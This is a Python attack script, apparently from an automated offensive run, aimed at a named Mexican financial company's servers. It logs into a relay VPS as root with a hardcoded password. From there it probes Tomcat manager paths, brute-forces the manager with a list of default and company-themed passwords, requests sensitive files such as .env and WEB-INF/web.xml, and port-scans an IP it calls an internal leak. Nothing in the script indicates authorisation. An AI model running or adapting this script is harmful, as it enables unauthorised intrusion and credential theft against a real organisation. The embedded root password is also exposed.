#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - Tomcat manager + Buzon Digital + CORE endpoints"""
import paramiko, json, time, re, sys, io, base64
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=2500):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}

    # 1. Tomcat manager + docs on port 8080
    print("\n[*] === Tomcat manager /docs ===")
    tomcat_urls = [
        "http://core.findep.mx:8080/manager/",
        "http://core.findep.mx:8080/manager/html",
        "http://core.findep.mx:8080/manager/text",
        "http://core.findep.mx:8080/manager/status",
        "http://core.findep.mx:8080/manager/jmxproxy",
        "http://core.findep.mx:8080/docs/",
        "http://core.findep.mx:8080/examples/",
        "http://core.findep.mx:8080/host-manager/",
        "http://core.findep.mx:8080/host-manager/html",
    ]
    tomcat_results = {}
    for url in tomcat_urls:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -o /tmp/tomcat.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=15)
        body, _ = ssh_exec(client, "head -c 2000 /tmp/tomcat.html", timeout=10)
        tomcat_results[url] = {"response": out.strip(), "body": body[:1500]}
        print(f"  {url}: {out.strip()}")
        if "HTTP:200" in out or "HTTP:401" in out or "HTTP:403" in out:
            safe_print(f"    body: {body[:1000]}")
    log["tomcat_probe"] = tomcat_results

    # 2. Tomcat manager default creds
    print("\n[*] === Tomcat manager default creds ===")
    tomcat_creds = [
        ("tomcat", "tomcat"),
        ("admin", "admin"),
        ("admin", "tomcat"),
        ("tomcat", "admin"),
        ("admin", ""),
        ("manager", "manager"),
        ("role1", "role1"),
        ("role", "role"),
        ("both", "both"),
        ("weblogic", "Findep2021"),
        ("weblogic", "welcome1"),
        ("admin", "Findep2021"),
        ("admin", "Findep2024"),
        ("admin", "Findep2025"),
        ("admin", "Findep2026"),
        ("admin", "Capacita-1"),
        ("admin", "Fisa2022*"),
        ("admin", "F1SA2024*#"),
        ("admin", "BcF1s42o2d*"),
        ("admin", "4dm1n##*2411"),
    ]
    tomcat_auth_results = []
    for user, pwd in tomcat_creds:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -u '{user}:{pwd}' "
               f"-o /tmp/tomcat_auth.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
               f"'http://core.findep.mx:8080/manager/html'")
        out, _ = ssh_exec(client, cmd, timeout=15)
        body, _ = ssh_exec(client, "head -c 500 /tmp/tomcat_auth.html", timeout=10)
        success = "HTTP:200" in out and "Server Info" in body
        print(f"  {user}:{pwd} -> {out.strip()} | success={success}")
        if success:
            print(f"  !!! TOMCAT MANAGER ACCESS GRANTED !!!")
            safe_print(body[:2000])
        tomcat_auth_results.append({"user": user, "password": pwd, "response": out.strip(),
                                     "body": body[:1000], "success": success})
        time.sleep(0.5)
    log["tomcat_auth"] = tomcat_auth_results

    # 3. Buzon Digital internal service
    print("\n[*] === Buzon Digital (internal IP leak) ===")
    buzon_urls = [
        "http://35.192.238.30:8080/BuzonDigital/",
        "http://35.192.238.30:8080/",
        "http://35.192.238.30:8080/BuzonDigital/login",
        "http://35.192.238.30:8080/BuzonDigital/api",
        "http://35.192.238.30/",
        "http://35.192.238.30:8080/BuzonDigital/index.jsp",
        "http://35.192.238.30:8080/BuzonDigital/index.html",
    ]
    buzon_results = {}
    for url in buzon_urls:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -o /tmp/buzon.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}} REDIR:%{{redirect_url}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        body, _ = ssh_exec(client, "head -c 2000 /tmp/buzon.html", timeout=10)
        buzon_results[url] = {"response": out.strip(), "body": body[:1500]}
        print(f"  {url}: {out.strip()}")
        if "HTTP:200" in out or "HTTP:302" in out or "HTTP:401" in out:
            safe_print(f"    body: {body[:1000]}")
    log["buzon_digital"] = buzon_results

    # 4. CORE endpoints - loginUsuario.jsp, cambiaPassword.do, valida.do
    print("\n[*] === CORE endpoints ===")
    core_urls = [
        "https://core.findep.mx/loginUsuario.jsp",
        "https://core.findep.mx/cambiaPassword.do",
        "https://core.findep.mx/valida.do",
        "https://core.findep.mx/login.jsp",
        "https://core.findep.mx/index.jsp",
        "https://core.findep.mx/WEB-INF/web.xml",
        "https://core.findep.mx/META-INF/context.xml",
        "https://core.findep.mx/robots.txt",
        "https://core.findep.mx/sitemap.xml",
        "https://core.findep.mx/.env",
        "https://core.findep.mx/server-status",
        "https://core.findep.mx/manager/",
        "https://core.findep.mx/manager/html",
    ]
    core_results = {}
    for url in core_urls:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -o /tmp/core_ep.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=15)
        body, _ = ssh_exec(client, "head -c 2000 /tmp/core_ep.html", timeout=10)
        core_results[url] = {"response": out.strip(), "body": body[:1500]}
        print(f"  {url}: {out.strip()}")
        if "HTTP:200" in out and "SIZE:0" not in out:
            safe_print(f"    body: {body[:1000]}")
    log["core_endpoints"] = core_results

    # 5. Probe more internal IPs from Google Cloud range
    print("\n[*] === Probe 35.192.238.30 ports ===")
    ports_to_try = [80, 443, 8080, 8000, 8888, 9000, 9090, 22, 3389, 5432, 3306, 1433, 1521, 7001]
    open_ports_internal = []
    for port in ports_to_try:
        cmd = f"timeout 3 bash -c 'echo > /dev/tcp/35.192.238.30/{port}' 2>&1 && echo 'OPEN' || echo 'CLOSED'"
        out, _ = ssh_exec(client, cmd, timeout=8)
        if "OPEN" in out:
            open_ports_internal.append(port)
            print(f"  Port {port}: OPEN")
    log["internal_ip_ports"] = open_ports_internal

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_tomcat.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Tomcat/Buzon results saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
